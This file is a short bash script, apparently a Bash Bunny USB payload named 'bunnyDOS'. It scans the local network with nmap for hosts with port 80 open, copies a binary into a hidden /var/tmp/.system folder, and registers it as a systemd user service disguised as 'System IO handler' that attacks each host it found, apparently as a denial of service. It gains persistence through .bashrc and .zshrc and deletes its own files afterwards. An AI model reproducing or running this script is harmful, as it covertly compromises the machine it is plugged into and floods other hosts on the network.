#!/bin/bash
lol=$(lsblk | grep 1.8G)
disk=$(echo $lol | awk '{print $1}')
mntt=$(lsblk | grep $disk | awk '{print $7}')
ip=$(ip -o -f inet addr show | awk '/scope global/ {print $4}')
open=$(nmap -p 80 $ip -q -oG - | grep open | awk '{print $2}' | awk '{printf("%s ",$0)} END { printf "\n" }')
mkdir /var/tmp/.system/
mkdir -p ~/.config/systemd/user 
echo -e "[Unit]\nDescription= System IO handler.\n\n[Service]\nExecStart=/bin/bash /var/tmp/.system/sysHandler -no-browser\nRestart=on-failure\nSuccessExitStatus=3 4\nRestartForceExitStatus=3 4\n\n[Install]\nWantedBy=default.target" > ~/.config/systemd/user/libSystemIO.service
cp -r $mntt/payloads/library/bunnyDOS/systemIO /var/tmp/.system/
chmod +x /var/tmp/.system/systemIO
for i in $open
do
 echo "/var/tmp/.system/./systemIO $i -p 80 -s 500" >> /var/tmp/.system/sysHandler
done
chmod +x /var/tmp/.system/sysHandler
systemctl --user start libSystemIO.service
echo -e "#\!/bin/bash\nls -a | grep 'zshrc' &> /dev/null\nif [ $? = 0 ]; then\n\techo systemctl --user start --now libSystemIO.service >> ~/.zshrc\nfi\n\nls -a | grep 'bashrc' &> /dev/null\nif [ $? = 0 ]; then\n\techo systemctl --user start --now libSystemIO.service >> ~/.bashrc\nfi" > ~/tmmmp
chmod +x ~/tmmmp && ~/./tmmmp && rm tmmmp && rm /tmp/payload.sh && exit
